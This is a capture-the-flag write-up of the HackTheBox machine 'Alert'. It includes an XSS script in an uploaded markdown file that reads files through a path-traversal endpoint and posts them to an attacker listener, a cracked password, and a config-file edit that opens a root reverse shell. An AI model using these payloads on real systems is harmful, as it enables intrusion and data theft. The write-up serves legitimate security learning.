---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/alert/","tags":["#linux","#other-tags","XSS","csrf","lfi"]}
---


# 10.10.11.44
---
# Enumeration &  Recon

## ports
```bash hl:7-8
[open ports output](<PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)>)
```
- resolves to alert.htb
- seems to be a markdown viewer with a file upload.
- contact page with an email/message check for link clicking callbacks if it's actually sending a post request, **looks like we got a clicker**
![Pasted image 20241124101113.png](/img/user/img/Pasted%20image%2020241124101113.png)
- donation page kinda stands out to me as well, might be able to mess with the backend money value
- site is running php on apache
- dealing with a fully custom php app so should break out burp
- looks like header and footer with central container swap based on get param
## vhosts
- vhost on statistics
```bash hl:1
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15]
```
![Pasted image 20241124091559.png](/img/user/img/Pasted%20image%2020241124091559.png)
has basic http auth, need to find a valid account. admin likely

## creds
`albert:manchesterunited`


# Exploitation 

## what might work
- ~~upload a webshell~~
	- ~~filetype change~~
	- ~~magic bytes~~
	- ~~null bute extension~~
- ~~we can share a link via a get param, so we likely have lfi also~~
	- ~~fuzz lfi techniques or try em manually~~
- ~~hydra bruteforce http auth on stats vhost~~
- alert name of the box might be hinting at some kind of xss, markdown based?

## what did
- xss in uploadable .md file
- share link to contact page
- can read files on `messages.php?file=../index.php` example

- check vhost config at `/etc/apache2/sites-available/000-default.conf`
- check `AuthUserFile /var/www/statistics.alert.htb/.htpasswd`
- grab hash and crack with hashcat: m 1600, apache md5


> [!bug]+ payload for uploaded markdown
> ```js
> \<script>
> fetch("/messages.php?file=../../../../../../etc/hosts")
>   .then(response => response.text())
>   .then(data => {
>      fetch("http://$attIP:$attPORT/", {
>           method: "POST",
>           body: data 
>       });
>   });
> \</script>
> ```
> >[!example]+ details
> > - fetch the lfi endpoint
> > - then take the reponse and get the text of it
> > - send that data to our listener



```bash
ssh albert@alert.htb
The authenticity of host 'alert.htb (10.10.11.44)' can't be established.
ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'alert.htb' (ED25519) to the list of known hosts.
albert@alert.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

---SNIP---

Last login: Tue Nov 19 14:19:09 2024 from 10.10.14.23
albert@alert:~$ 

```
# Post Exploitation 

## what worked
- check `ps -aux`
- root is running `/opt/website-montitor`
	- `root         999  1.7  0.6 281068 26888 ?        Ss   01:23   1:08 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor`
- albert's group can edit the website config file
```bash
  albert@alert:/opt/website-monitor/config$ ls -al
total 12
drwxrwxr-x 2 root management 4096 Nov 26 02:25 .
drwxrwxr-x 7 root root       4096 Oct 12 01:07 ..
-rwxrwxr-x 1 root management   49 Nov 26 02:30 configuration.php
albert@alert:/opt/website-monitor/config$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```
- edit the config, have it launch a revshell or something
	- chmod +s /bin/bash etc
- it reverts pretty quickly so I thought it would be easier to notice with a revshell

```bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4451
Ncat: Listening on 0.0.0.0:4451
Ncat: Connection from 10.10.11.44.
Ncat: Connection from 10.10.11.44:49262.
/bin/sh: 0: can't access tty; job control turned off
# ls
root.txt
scripts
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt	
ebe95ae8a7b577ae5bbcdb518f927492                         
```

